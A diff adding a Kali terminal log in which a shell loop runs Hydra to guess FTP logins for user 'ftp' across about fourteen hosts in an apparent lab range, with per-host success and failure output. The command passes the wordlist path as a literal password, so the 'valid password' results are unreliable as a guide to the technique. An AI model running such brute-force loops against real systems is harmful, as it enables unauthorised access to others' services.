@@ -1,0 +1,165 @@
+root@kali:~/gen/password# for ips in $(cat ftpips.txt); do hydra -t 1 -l ftp -p /root/gen/password/johnpassword.txt  -vV $ips ftp;done 
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:17:59
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.8 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.8   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.8 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:18:00
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:18:00
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.13 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.13   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.13 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:18:01
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:18:01
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.14 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.14   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.14 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:18:02
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:18:02
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.22 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.22 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[STATUS] 1.00 tries/min, 1 tries in 00:01h, 1 to do in 00:01h, 1 active
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.22 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[STATUS] attack finished for 10.11.1.22 (waiting for children to finish) ...
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:19:40
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:19:41
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.115 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.115   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.115 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:19:42
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:19:42
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.116 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[STATUS] attack finished for 10.11.1.116 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:19:58
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:19:58
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.125 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.125   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.125 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:19:59
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:19:59
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[STATUS] attack finished for 10.11.1.128 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:00
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:20:00
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[STATUS] attack finished for 10.11.1.146 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:03
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:20:03
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.202 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.202   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.202 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:04
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:20:04
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[STATUS] attack finished for 10.11.1.220 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:05
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:20:05
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[STATUS] attack finished for 10.11.1.226 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:21
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:20:21
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.227 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[21][ftp] host: 10.11.1.227   login: ftp   password: /root/gen/password/johnpassword.txt
+[STATUS] attack finished for 10.11.1.227 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:22
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-17 15:20:22
+[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.229 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.229 - login "ftp" - pass "/root/gen/password/johnpassword.txt" - 1 of 1 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[STATUS] attack finished for 10.11.1.229 (waiting for children to finish) ...
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-17 15:20:26
+root@kali:~/gen/password# 
+
